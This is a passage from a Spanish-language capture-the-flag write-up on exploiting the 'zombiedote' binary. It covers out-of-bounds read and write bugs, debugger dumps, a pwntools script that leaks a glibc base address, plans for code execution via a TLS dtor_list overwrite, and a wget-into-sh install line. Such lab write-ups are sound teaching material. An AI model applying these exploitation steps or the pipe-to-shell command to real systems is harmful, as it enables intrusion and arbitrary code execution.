+<span class="mtk1">    </span><span class="mtk8">scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%lu</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">index);</span>
+<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Virus concentration level in sample #</span><span class="mtk6">%ld</span><span class="mtk4"> (</span><span class="mtk6">%%</span><span class="mtk4">): "</span><span class="mtk1">, index);</span>  
+<span class="mtk1">    </span><span class="mtk8">scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%lf</span><span class="mtk4">"</span><span class="mtk1">, log-&gt;samples[index]);</span>
+<span class="mtk1">    log-&gt;n_edits</span><span class="mtk5">++</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk4">"Log edited."</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">"Maximum number of edits has been reached."</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>En esta función, se nos permite escribir en un <em>offset</em> de <code>log->samples</code>. Nuevamente, tenemos una primitiva de escritura OOB, porque controlamos el <code>index</code> dónde escribir y no hay verificaciones de límites. Como antes, debemos ingresar el valor como un <code>double</code>. Además, obsérvese que tenemos un máximo de dos ediciones.</p><h3 id="función-de-información">Función de información</h3><p>Por último, pero no menos importante, tenemos <code>inspect</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">inspect</span><span class="mtk1">(</span><span class="mtk7 mtki">log_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">log</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> number;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (log-&gt;samples </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">"No log to inspect."</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (log-&gt;inspected </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">    number </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Enter sample number to inspect: "</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%lu</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">number);</span>
+<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Virus concentration level in sample #</span><span class="mtk6">%ld</span><span class="mtk4"> (</span><span class="mtk6">%%</span><span class="mtk4">): </span><span class="mtk6">%.16g\n</span><span class="mtk4">"</span><span class="mtk1">, log-&gt;samples[number], number);</span>  
+<span class="mtk1">    log-&gt;inspected </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk4">"Log inspected."</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk4">"The log has already been inspected."</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Al igual que en <code>edit</code>, se nos pide un índice para leer su valor. Dado que no hay verificación de límites, tenemos una lectura OOB como un número de punto flotante. Sin embargo, solo podemos llamar a <code>inspect</code> una vez.</p><h2 id="estrategia-de-explotación">Estrategia de explotación</h2><p>En resumen, tenemos:</p><ul><li>Posibilidad de asignar un <em>chunk</em> enorme en <code>create</code> que se gestione con <code>mmap</code> y añadir valores <code>double</code></li><li><em>Integer Overflow</em> en <code>create</code> que se puede explotar para tener un número casi ilimitado de inserciones a partir de la dirección de <code>log->samples</code></li><li>Dos escrituras OOB relativas a <code>log->samples</code> (como <code>double</code>)</li><li>Una lectura OOB relativa a <code>log->samples</code> (como <code>double</code>)</li></ul><p>Obsérvese que el programa usa Glibc 2.34:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./glibc/ld-2.34.so</span> <span class="mtku">./glibc/libc.so.6</span>
+GNU C Library (Ubuntu GLIBC 2.34-0ubuntu1) stable release version 2.34.  
+Copyright (C) 2021 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 10.3.0.
+libc ABIs: UNIQUE IFUNC ABSOLUTE
+For bug reporting instructions, please see:
+&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
+</code></pre></div><p>Esto es relevante porque es una versión de Glibc moderna, con muchos parches. Por ejemplo, los <em>exploits</em> de <em>House of Force</em> y <em>House of Orange</em> están parcheados, por lo que no podemos usar las inserciones ilimitadas para modificar el tamaño del <em>top chunk</em>. Además, no es fácil fugar direcciones de memoria del <em>heap</em>.</p><h3 id="_chunk_-de-mmap"><em>Chunk</em> de <code>mmap</code></h3><p>Si ponemos en un gran tamaño para el <em>chunk</em>, se asignará con <code>mmap</code> en un espacionde memoria entre <code>libc.so.6</code> y <code>ld-2.34.so</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">zombiedote</span>
+Reading symbols from <span class="code-dark-green">zombiedote</span>...
+(No debugging symbols found in <span class="code-dark-green">zombiedote</span>)
+<span class="code-red">pwndbg&gt; </span>aslr on
+ASLR is <span class="code-dark-green">ON</span> (show disable-randomization)
+<span class="code-red">pwndbg&gt; </span>break insert
+Breakpoint 1 at <span class="code-dark-blue">0x159b</span>
+<span class="code-red">pwndbg&gt; </span>run
+Starting program: <span class="code-dark-green">./zombiedote</span>
+warning: Expected absolute pathname for libpthread in the inferior, but got <span class="code-dark-green">./glibc/libc.so.6</span>.
+warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.  
+<span class="code-white">[ BioShield Solutions Research Institute ]</span>
+<span class="code-blue">Virus Concentration Levels Logging - Manual Mode: </span><span class="code-green">ON</span>
+
+<span class="code-blue">[ MANUAL MODE LOGGING ]</span>
+<span class="code-white">[1] Create log</span>
+<span class="code-white">[2] Insert into log</span>
+<span class="code-white">[3] Delete log</span>
+<span class="code-white">[4] Edit log</span>
+<span class="code-white">[5] Inspect log</span>
+<span class="code-white">&gt;&gt; 1</span>
+
+<span class="code-white">Number of samples: 17000</span>
+
+<span class="code-green">[+] Created a log.</span>
+
+<span class="code-blue">[ MANUAL MODE LOGGING ]</span>
+<span class="code-white">[1] Create log</span>
+<span class="code-white">[2] Insert into log</span>
+<span class="code-white">[3] Delete log</span>
+<span class="code-white">[4] Edit log</span>
+<span class="code-white">[5] Inspect log</span>
+<span class="code-white">&gt;&gt; 2</span>
+
+<span class="code-white">Breakpoint 1, <span class="code-blue">0x0000561b1384a59b</span> in <span class="code-dark-yellow">insert</span> ()
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>p/x $rdi
+$1 = 0x7ffd8d22cfe0
+<span class="code-red">pwndbg&gt; </span>x/4gx $rdi
+<span class="code-dark-blue">0x7ffd8d22cfe0</span>: 0x0000000000004268      0x00007f890cace010
+<span class="code-dark-blue">0x7ffd8d22cff0</span>: 0x0000000000000000      0x00007f8900000000
+<span class="code-red">pwndbg&gt; </span>x/10gx 0x00007f890cace000
+<span class="code-dark-blue">0x7f890cace000</span>: 0x0000000000000000      0x0000000000022002
+<span class="code-dark-blue">0x7f890cace010</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f890cace020</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f890cace030</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f890cace040</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-red">pwndbg&gt; </span>vmmap
+LEGEND: <span class="code-dark-yellow">STACK</span> | <span class="code-dark-blue">HEAP</span> | <span class="code-dark-red">CODE</span> | <span class="code-dark-magenta">DATA</span> | <span class="mtku">RWX</span> | RODATA
+             Start                End Perm     Size Offset File
+    0x561b13849000     0x561b1384a000 r--p     1000      0 ./zombiedote
+<span class="code-dark-red">    0x561b1384a000     0x561b1384b000 r-xp     1000   1000 ./zombiedote</span>
+    0x561b1384b000     0x561b1384c000 r--p     1000   2000 ./zombiedote
+    0x561b1384c000     0x561b1384d000 r--p     1000   2000 ./zombiedote
+<span class="code-dark-magenta">    0x561b1384d000     0x561b1384e000 rw-p     1000   3000 ./zombiedote</span>
+<span class="code-dark-magenta">    0x561b1384e000     0x561b13851000 rw-p     3000   5000 ./zombiedote</span>
+<span class="code-dark-blue">    0x561b15356000     0x561b15377000 rw-p    21000      0 [heap]</span>
+    0x7f890c800000     0x7f890c82c000 r--p    2c000      0 ./glibc/libc.so.6
+<span class="code-dark-red">    0x7f890c82c000     0x7f890c9c0000 r-xp   194000  2c000 ./glibc/libc.so.6</span>
+    0x7f890c9c0000     0x7f890ca14000 r--p    54000 1c0000 ./glibc/libc.so.6
+    0x7f890ca14000     0x7f890ca15000 ---p     1000 214000 ./glibc/libc.so.6
+    0x7f890ca15000     0x7f890ca18000 r--p     3000 214000 ./glibc/libc.so.6
+<span class="code-dark-magenta">    0x7f890ca18000     0x7f890ca1b000 rw-p     3000 217000 ./glibc/libc.so.6</span>
+<span class="code-dark-magenta">    0x7f890ca1b000     0x7f890ca28000 rw-p     d000      0 [anon_7f890ca1b]</span>
+<span class="code-dark-magenta">    0x7f890cace000     0x7f890caf5000 rw-p    27000      0 [anon_7f890cace]</span>
+    0x7f890caf5000     0x7f890caf6000 r--p     1000      0 ./glibc/ld-2.34.so  
+<span class="code-dark-red">    0x7f890caf6000     0x7f890cb1e000 r-xp    28000   1000 ./glibc/ld-2.34.so</span>
+    0x7f890cb1e000     0x7f890cb28000 r--p     a000  29000 ./glibc/ld-2.34.so
+    0x7f890cb28000     0x7f890cb2a000 r--p     2000  32000 ./glibc/ld-2.34.so
+<span class="code-dark-magenta">    0x7f890cb2a000     0x7f890cb2c000 rw-p     2000  34000 ./glibc/ld-2.34.so</span>
+<span class="code-dark-yellow">    0x7ffd8d20e000     0x7ffd8d22f000 rw-p    21000      0 [stack]</span>
+    0x7ffd8d29f000     0x7ffd8d2a3000 r--p     4000      0 [vvar]
+<span class="code-dark-red">    0x7ffd8d2a3000     0x7ffd8d2a5000 r-xp     2000      0 [vdso]</span>
+<span class="code-dark-red">0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
+</code></pre></div><p>He usado <code>17000</code> porque <code>8 * 17000 = 0x21340</code>, que es mayor que el tamaño del <em>heap</em> (<code>0x21000</code>). El <em>chunk</em> de <code>mmap</code> se posiciona en <code>anon_7f890cace</code>, entre <code>libc.so.6</code> y <code>ld-2.34.so</code>.</p><p>Obsérvese que hay una página de guarda entre el <em>chunk</em> de <code>mmap</code> y <code>libc.so.6</code> (el espacio entre <code>anon_7f890ca1b</code> y <code>anon_7f890cace</code> es aleatorio). Sin embargo, el <em>offset</em> entre el <em>chunk</em> de <code>mmap</code> y <code>ld-2.34.so</code> es fijo.</p><h3 id="fugando-direcciones-de-memoria">Fugando direcciones de memoria</h3><p>El hecho de que el <em>chunk</em> tenga un <em>offset</em> fijo a <code>ld-2.34.so</code> nos permite acceder a este espacio de direcciones con <code>inspect</code> y buscar un puntero de Glibc para evador el ASLR. Si hacemos esto, no podremos usar más <code>inspect</code>.</p><p>Aquí, también consideré tratar de filtrar una dirección de la pila (en Glibc <code>environ</code>). Con esto, quería modificar la estructura <code>log</code> y tener lectura/escritura OOB ilimitadas. Pero no es posible porque el <em>offset</em> a la pila no es fioa desde la posición del <em>chunk</em>, y no sabemos dónde se coloca.</p><p>Entonces, la mejor fuga para obtener es una dirección Glibc. Encontré algunos punteros en la sección morada de <code>ld-2.34.so</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/30gx 0x7f890cb2a000
+<span class="code-dark-blue">0x7f890cb2a000</span>: 0x0000000000034e70      0x0000000000000000
+<span class="code-dark-blue">0x7f890cb2a010</span>: 0x0000000000000000      0x00007f890c978140
+<span class="code-dark-blue">0x7f890cb2a020</span> &lt;<span class="code-dark-yellow">_dl_signal_exception@got.plt</span>&gt;:  0x00007f890c978080      0x00007f890c9780e0  
+<span class="code-dark-blue">0x7f890cb2a030</span> &lt;<span class="code-dark-yellow">_dl_catch_error@got.plt</span>&gt;:       0x00007f890c978260      0x0000000000000000
+<span class="code-dark-blue">0x7f890cb2a040</span> &lt;<span class="code-dark-yellow">_rtld_global</span>&gt;:  0x00007f890cb2b220      0x0000000000000004
+<span class="code-dark-blue">0x7f890cb2a050</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+16&gt;:       0x00007f890cb2b4e0      0x0000000000000000
+<span class="code-dark-blue">0x7f890cb2a060</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+32&gt;:       0x00007f890caf32b0      0x0000000000000000
+<span class="code-dark-blue">0x7f890cb2a070</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+48&gt;:       0x0000000000000000      0x0000000000000001
+<span class="code-dark-blue">0x7f890cb2a080</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+64&gt;:       0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f890cb2a090</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+80&gt;:       0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f890cb2a0a0</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+96&gt;:       0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f890cb2a0b0</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+112&gt;:      0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f890cb2a0c0</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+128&gt;:      0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f890cb2a0d0</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+144&gt;:      0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f890cb2a0e0</span> &lt;<span class="code-dark-yellow">_rtld_global</span>+160&gt;:      0x0000000000000000      0x0000000000000000
+<span class="code-red">pwndbg&gt; </span>x 0x00007f890c978260
+<span class="code-dark-blue">0x7f890c978260</span> &lt;<span class="code-dark-yellow">__GI__dl_catch_error</span>&gt;:  0x89495441fa1e0ff3
+<span class="code-red">pwndbg&gt; </span>p/d (0x7f890cb2a030 - 0x7f890cace010) / 8
+$2 = 47108
+</code></pre></div><h2 id="desarrollo-de-explotación">Desarrollo de explotación</h2><p>Comencemos a escribir el <em>exploit</em>. Usaremos estas funciones auxiliares:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk9 mtki">number</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Number of samples: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">number</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">insert</span><span class="mtk1">(</span><span class="mtk9 mtki">samples</span><span class="mtk1">: </span><span class="mtk1">List</span><span class="mtk1">[</span><span class="mtk8 mtku">float</span><span class="mtk1">]):</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Number of samples tested: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk9 mtki">samples</span><span class="mtk1">)).</span><span class="mtk8">encode</span><span class="mtk1">())</span>  
+
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">sample</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk9 mtki">samples</span><span class="mtk1">:</span>
+<span class="mtk1">        </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'(%): '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk1">sample</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">delete</span><span class="mtk1">():</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'3'</span><span class="mtk1">)</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk9 mtki">number</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">sample</span><span class="mtk1">: </span><span class="mtk8 mtku">float</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'4'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter sample number: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">number</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'(%): '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">sample</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">inspect</span><span class="mtk1">(</span><span class="mtk9 mtki">number</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">float</span><span class="mtk1">:</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'5'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter sample number to inspect: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">number</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'(%): '</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">float</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">decode</span><span class="mtk1">())</span>
+</code></pre></div><p>Implementemos el procedimiento para fugar una dirección de Glibc y encontrar la dirección base para evadir el ASLR:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">17000</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk8">pack</span><span class="mtk1">(</span><span class="mtk4">'d'</span><span class="mtk1">, </span><span class="mtk8">inspect</span><span class="mtk1">(</span><span class="mtk6">47108</span><span class="mtk1">))) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.</span><span class="mtk6">__GI__dl_catch_error</span>  
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+</code></pre></div><p>Aquí la tenemos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './zombiedote'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc'</span>
+[<span class="code-green">+</span>] Starting local process './zombiedote': pid 2259404  
+[<span class="code-green">+</span>] Glibc base address: 0x7fe9fac00000
+[<span class="code-blue">*</span>] Switching to interactive mode
+
+<span class="code-green">[+] L</span>og inspected.
+
+<span class="code-blue">[</span> MANUAL MODE LOGGING ]
+<span class="code-white">[1] Create log</span>
+<span class="code-white">[2] Insert into log</span>
+<span class="code-white">[3] Delete log</span>
+<span class="code-white">[4] Edit log</span>
+<span class="code-white">[5] Inspect log</span>
+<span class="code-white">&gt;&gt; <span class="code-red">$</span>
+</code></pre></div><h3 id="obteniendo-rce">Obteniendo RCE</h3><p>En este punto, tenemos dos escrituras OOB para lograr ejecución del código arbitrario. Sin embargo, solo disponemos de <em>offsets</em> relativos a <code>ld-2.34.so</code>. Encontré <a href="https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md">esta lista increíble</a> de técnicas de explotación modernas para GLIBC >= 2.34, pero no pude implementar ninguna de estas técnicas con la situación actual.</p><p>El problema es que no tenemos un <em>offset</em> fijo a Glibc desde el <em>chunk</em> de <code>mmap</code>. Todas las técnicas requieren un espacio de memoria para mantener una estructura falsa (<code>exit_handler</code>, <code>link_map</code>, <code>FILE</code>), que es posible debido a <code>insert</code>. Pero luego necesitamos modificar la memoria de Glibc para señalar a nuestro <em>chunk</em> de <code>mmap</code>, y no sabemos dónde estamos ubicados.</p><p>La técnica más simple que encontré para esta situación es modificar el <em>Thread Local Storage</em> (TLS) para insertar un objeto <code>dtor_list</code> Eso apunta al <em>chunk</em>, que tiene <code>system</code> y la dirección de <code>"/bin/sh"</code> (más información <a href="https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md#5---code-execution-via-tls-storage-dtor_list-overwrite">aquí</a>). Pero de nuevo, ¡necesito un puntero al <em>chunk</em>!</p><p>Podríamos considerar usar fuerza bruta en la dirección del <em>chunk</em> de <code>mmap</code>, debido a que los tamaños de página de guarda son más o menos predecibles, solo cambian 12 bits. Pero esto daría como resultado una probabilidad de 1/4096 de tener éxito, por lo que no es muy asequible.</p><h3 id="cambiando-a-docker">Cambiando a Docker</h3><p>Después de mucha investigación tratando de encontrar una técnica adecuada que pudiera funcionar en esta situación, probé el <em>exploit</em> actual en la instancia remota, para ver si pasaba lo mismo, y descubrí que la dirección de Glibc era incorrecta, por lo que no estaba obteniendo una dirección de Glibc utilizando el enfoque anterior. Luego, arranqué la imagen de Docker proporcionada y vi el mismo comportamiento.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 94.237.56.248:52869
+[<span class="code-blue">*</span>] './zombiedote'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc'</span>
+[<span class="code-green">+</span>] Opening connection to 94.237.56.248 on port 52869: Done  
+[<span class="code-green">+</span>] Glibc base address: 0x1e8948f8e16b85c2
+[<span class="code-blue">*</span>] Switching to interactive mode
+
+<span class="code-green">[+] L</span>og inspected.
+
+<span class="code-blue">[</span> MANUAL MODE LOGGING ]
+<span class="code-white">[1] Create log</span>
+<span class="code-white">[2] Insert into log</span>
+<span class="code-white">[3] Delete log</span>
+<span class="code-white">[4] Edit log</span>
+<span class="code-white">[5] Inspect log</span>
+<span class="code-white">&gt;&gt; <span class="code-red">$</span>
+</code></pre></div><p>Investigué este problema ejecutando GDB (usando la <a href="https://github.com/bata24/gef">extensión <code>gef</code> de bata24</a>) dentro del contenedor (modificado para tener acceso como <code>root</code>) y hacer los mismos pasos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> run -it --rm -v <span class="code-dark-yellow">"<span class="code-dark-cyan">$PWD</span>:/tmp"</span> zombiedote sh
+# apk update
+...
+# apk add python3 py3-pip wget git gdb
+...
+# wget -q https://raw.githubusercontent.com/bata24/gef/dev/install.sh -O- | sh
+...
+</span># gdb -q zombiedote
+Loading GEF...
+<span class="code-blue">[+]</span> Not found /root/.gef.rc, use default settings.
+Reading symbols from <span class="code-dark-green">zombiedote</span>...
+(No debugging symbols found in <span class="code-dark-green">zombiedote</span>)
+<span class="code-red">gef&gt; </span>aslr on
+<span class="code-blue">[+]</span> Enabling ASLR
+<span class="code-red">gef&gt; </span>break insert
+Breakpoint 1 at <span class="code-dark-blue">0x159b</span>
+<span class="code-red">gef&gt; </span>run
+Starting program: <span class="code-dark-green">/home/ctf/zombiedote</span>
+warning: Expected absolute pathname for libpthread in the inferior, but got <span class="code-dark-green">./glibc/libc.so.6</span>.
+warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.  
+<span class="code-white">[ BioShield Solutions Research Institute ]</span>
+<span class="code-blue">Virus Concentration Levels Logging - Manual Mode: </span><span class="code-green">ON</span>
+
